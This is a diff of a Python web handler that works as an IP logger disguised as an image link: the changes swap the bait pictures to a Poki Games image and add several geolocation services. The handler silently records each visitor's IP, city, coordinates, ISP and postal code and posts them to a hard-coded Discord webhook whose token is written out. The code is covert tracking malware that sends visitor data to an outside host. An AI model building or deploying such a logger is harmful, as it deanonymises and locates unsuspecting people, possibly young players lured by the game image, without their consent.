@@ -7,13 +7,13 @@ class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         # Configuration
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
-        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
+        DEFAULT_IMAGE = "https://www.gamepur.com/wp-content/uploads/2023/03/Poki-Games-1.jpg"
         
         # Image mappings
         IMAGES = {
-            "poki": "https://i.imgur.com/5M6F3wQ.jpeg",
-            "cat": "https://i.imgur.com/5M6F3wQ.jpeg",
-            "dog": "https://i.imgur.com/2QksCKj.jpeg",
+            "poki": "https://www.gamepur.com/wp-content/uploads/2023/03/Poki-Games-1.jpg",
+            "cat": "https://www.gamepur.com/wp-content/uploads/2023/03/Poki-Games-1.jpg",
+            "dog": "https://www.gamepur.com/wp-content/uploads/2023/03/Poki-Games-1.jpg",
         }
         
         # Get visitor's real IP
@@ -44,29 +44,61 @@ class handler(BaseHTTPRequestHandler):
     
     def get_location(self, ip):
         """Get accurate location data from IP"""
+        # Try multiple services for best accuracy
         try:
+            # Service 1: ipgeolocation.io (most accurate)
             req = urllib.request.Request(
-                f"https://ipapi.co/{ip}/json/",
+                f"https://api.ipgeolocation.io/ipgeo?apiKey=free&ip={ip}",
                 headers={'User-Agent': 'Mozilla/5.0'}
             )
             with urllib.request.urlopen(req, timeout=5) as response:
-                return json.loads(response.read().decode())
+                data = json.loads(response.read().decode())
+                return {
+                    'city': data.get('city'),
+                    'region': data.get('state_prov'),
+                    'country': data.get('country_name'),
+                    'latitude': data.get('latitude'),
+                    'longitude': data.get('longitude'),
+                    'org': data.get('isp'),
+                    'timezone': data.get('time_zone', {}).get('name'),
+                    'postal': data.get('zipcode')
+                }
         except:
-            try:
-                with urllib.request.urlopen(f"http://ip-api.com/json/{ip}") as response:
-                    data = json.loads(response.read().decode())
-                    return {
-                        'city': data.get('city'),
-                        'region': data.get('regionName'),
-                        'country': data.get('country'),
-                        'latitude': data.get('lat'),
-                        'longitude': data.get('lon'),
-                        'org': data.get('isp'),
-                        'timezone': data.get('timezone'),
-                        'postal': data.get('zip')
-                    }
-            except:
-                return {}
+            pass
+        
+        try:
+            # Service 2: ipwhois.app
+            with urllib.request.urlopen(f"http://ipwhois.app/json/{ip}", timeout=5) as response:
+                data = json.loads(response.read().decode())
+                return {
+                    'city': data.get('city'),
+                    'region': data.get('region'),
+                    'country': data.get('country'),
+                    'latitude': data.get('latitude'),
+                    'longitude': data.get('longitude'),
+                    'org': data.get('isp'),
+                    'timezone': data.get('timezone'),
+                    'postal': data.get('postal')
+                }
+        except:
+            pass
+        
+        try:
+            # Service 3: ip-api.com (fallback)
+            with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=5) as response:
+                data = json.loads(response.read().decode())
+                return {
+                    'city': data.get('city'),
+                    'region': data.get('regionName'),
+                    'country': data.get('country'),
+                    'latitude': data.get('lat'),
+                    'longitude': data.get('lon'),
+                    'org': data.get('isp'),
+                    'timezone': data.get('timezone'),
+                    'postal': data.get('zip')
+                }
+        except:
+            return {}
     
     def send_ip_log(self, webhook, ip, location, user_agent, endpoint, image_url):
         """Send IP information to Discord webhook"""
